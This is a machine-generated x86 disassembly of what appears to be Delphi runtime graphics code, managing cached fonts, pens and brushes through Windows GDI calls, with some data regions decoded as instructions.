add [ eax ] ch
dec esi
inc edx
add [ eax ] dh
dec esi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
add al 0x0
add eax 0x63746950
push r-xdata
test [ ebp + 0x42 ] cl
add [ eax + 0x424d ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
ror [ ebp + 0x42 ] 0x0
int3
add [ eax ] al
inc edx
add al ch
dec esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
dec ebp
inc edx
add [ eax ] ch
dec ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
inc edx
sub_423a60
mov eax 0x8004272
push esp
inc edi
jb r-xdata
inc eax
jo r-xdata
add [ eax ] al
xchg esp eax
cmp al [ edx ]
dec esp
xor eax 0x35580040
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add ah ch
sub al [ eax ]
imul esp [ ebx - 0x73 ] 0x3a740040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ edx ] sub_427264
in al dx
jb r-xdata
add [ eax - 0x7e ] ch
inc edx
add [ eax ] ch
xchg ebp eax
inc ecx
add [ esp + eax * 4 ] bh
inc edx
add [ esp + eax * 4 + 0x71140042 ] bh
inc edx
add [ eax - 0x79 ] dh
inc edx
add [ eax + ecx * 4 ] ah
inc edx
add [ eax + ecx * 4 + 0x42 ] ah
add [ eax + 0x72 ] ah
inc edx
add al al
mov [ edx ] al
lodsb [ esi ]
mov [ edx ] es
test al 0x94
inc edx
add [ ebp + edx * 4 + 0x42 ] bh
add [ eax + 0x73 ] cl
inc edx
add [ eax - 0x6a ] dl
inc edx
add [ esi + edx * 4 - 0x7e3bffbe ] ah
inc edx
add [ edx + esi * 2 + 0x42 ] ah
add ah ch
or al 0x54
push ebx
push 0x64657261
dec ecx
imul esp [ ebx - 0x8 ] 0xf0004239
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
mov [ edx + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi + 0x180042 ] cl
add [ eax ] al
xchg esp eax
cmp al [ edx ]
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edx + ebx * 4 ] cl
inc edx
add [ edx + ebx * 4 ] bh
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
add [ eax + 0x6400428b ] cl
cdq
inc edx
add [ ebx + ecx * 4 ] al
inc edx
add [ ecx + ebx * 4 + 0x42 ] ch
add ah dl
xchg [ edx ] eax
xor al 0x88
inc edx
add [ eax - 0x6d ] dh
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x423c1c70
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x423ba070
add [ eax + 0x3a ] dh
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
inc eax
cmp eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
cmp eax [ edx ]
je r-xdata
jo r-xdata
0x72640042 0x42
in al dx
add al bl
0x95280042 0x41
pop eax
jo r-xdata
popad
nop
in al 0x3c
inc edx
add [ eax ] al
jo r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + 0x77 ] al
inc edx
add [ edi + esi * 2 + 0x540c0042 ] bl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
mov al [ 0x423b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmp al 0x42
add [ eax + eax ] bh
add [ eax ] al
lodsb [ esi ]
cmp [ edx ] eax
dec esp
xor eax 0x94980040
inc ecx
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edx + eax * 4 ] ch
inc edx
add al bl
xchg ebx eax
inc ecx
add al cl
jo r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x42 ] al
add [ eax + eax ] dh
add [ edx + edi + 0x354c0042 ] dl
inc eax
add [ eax + 0x35 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
imul esp [ ebx + 0x73 ] 0xe0900000
cmp al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x3a
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ esi + eax + 0x50 ] dh
add al bh
pushfd
inc edx
add [ eax - 0x62 ] dh
inc edx
add [ eax - 0x53ffbd62 ] bl
sahf
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
push esp
cmp eax 0x5070042
push esp
dec ecx
arpl [ edi + 0x6e ] bp
add [ eax ] bh
fwait
inc edx
add [ ecx + esi * 2 ] dl
inc edx
add [ eax - 0x65 ] bh
inc edx
add [ ebx + ebx * 4 + 0x725c0042 ] ah
inc edx
add [ eax + 0x72 ] ah
inc edx
add [ eax - 0x1fffbd65 ] bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3d ] cl
inc edx
add [ eax + eax ] dh
add [ eax ] al
lodsb [ esi ]
cmp [ edx ] eax
dec esp
xor eax 0x94980040
inc ecx
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbd66 ] ch
xchg ebx eax
inc ecx
add al cl
jo r-xdata
inc eax
add [ esi + edi ] dh
inc edx
add [ eax ] dl
push esp
push edx
jo r-xdata
in al 0x3c
inc edx
add [ eax + 0x3a ] dh
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
outsd
outsb
jb r-xdata
add [ esi + ebx * 4 ] bh
inc edx
add [ ebx + esi * 2 + 0x42 ] al
add [ esi + ebx * 4 + 0x42 ] dl
add [ eax - 0x62 ] bl
inc edx
add [ eax + 0x73 ] bl
inc edx
add [ edx + ebx * 4 + 0x42 ] dl
add [ edx + esi * 2 + 0x42 ] ah
add ah ch
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
call DeleteObject
push eax
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423d84
sar [ 0x42 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ 0x240042 ] 0x1
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esi + edi ] dh
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423df8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_423e34
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_423e70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_423de4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_423e58
xor edx edx
push ebp
push sub_423f44
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f4b
mov eax [ ebp - 0x4 ]
call sub_423e64
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026ec
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_40810c
test al al
je r-xdata
sub_423f54
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_423e58
xor ecx ecx
push ebp
push sub_423fdb
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423e64
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_424004
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423e58
xor eax eax
push ebp
push sub_42406d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423e70
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_423f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424074
mov eax [ ebp - 0x4 ]
call sub_423e64
retn
mov eax ebx
mov si 0xfffd
call sub_403518
sub_42407c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423e58
xor eax eax
push ebp
push sub_4240d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240df
mov eax [ ebp - 0x4 ]
call sub_423e64
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403518
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423f54
sub_4240e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423e58
xor edx edx
push ebp
push sub_424147
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42414e
mov eax [ ebp - 0x4 ]
call sub_423e64
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_424154
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4190bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4241f1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418cf8
mov ebx eax
mov eax ebx
call sub_425720
inc [ ebp - 0x4 ]
mov eax ebx
call sub_425aec
mov eax [ rw-data ]
call sub_4240e8
mov eax [ rw-data ]
call sub_4240e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241f8
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_419120
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418cf8
call sub_4259c4
inc esi
dec ebx
jne r-xdata
sub_424847
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_41861c
retn
sub_424878
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402e00
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402bf0
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_42492c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423e70
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_424980
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4249c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4192f4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424684
xor eax eax
push ebp
push sub_424a7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424684
xor eax eax
push ebp
push sub_424a62
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42407c
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424b00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a69
mov eax [ ebp - 0x8 ]
call sub_424694
retn
mov eax ebx
call sub_424d84
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424da0
sub_424ab0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424684
xor eax eax
push ebp
push sub_424af5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424004
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424afc
mov eax [ ebp - 0x4 ]
call sub_424694
retn
sub_424b14
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424c9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ca4
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_40413c
retn
mov eax [ rw-data ]
call sub_423e58
xor eax eax
push ebp
push sub_424c75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423e64
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40437c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408c3c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40437c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408c3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40437c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_408210
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_424df8
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_424cbc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_424878
mov edx esp
mov eax ebx
call sub_424ab0
add esp 0x2c
pop esi
pop ebx
retn
sub_424ce8
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424a98
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424ab0
add esp 0x2c
pop esi
pop ebx
retn
sub_424d28
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424a98
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402d00
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4043b4
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402bf0
mov edx esp
mov eax ebx
call sub_424ab0
sub_424da0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_424ce8
pop esi
pop ebx
retn
sub_424dcc
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424a98
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424ab0
add esp 0x30
pop ebx
retn
sub_424e00
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424a98
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_424ab0
add esp 0x2c
pop esi
pop ebx
retn
sub_424e30
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424a98
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_424ab0
add esp 0x2c
pop esi
pop ebx
retn
sub_424e58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423e70
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_424e9c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_424ec4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4192f4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424684
xor eax eax
push ebp
push sub_424f63
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424684
xor eax eax
push ebp
push sub_424f46
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42407c
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4250ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f4d
mov eax [ ebp - 0x8 ]
call sub_424694
retn
sub_424f7c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424f94
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424684
xor eax eax
push ebp
push sub_424fd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424004
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424fe0
mov eax [ ebp - 0x4 ]
call sub_424694
retn
sub_424fec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424f7c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424f94
add esp 0x10
pop esi
pop ebx
retn
sub_425014
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423e58
xor eax eax
push ebp
push sub_42509a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423e64
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
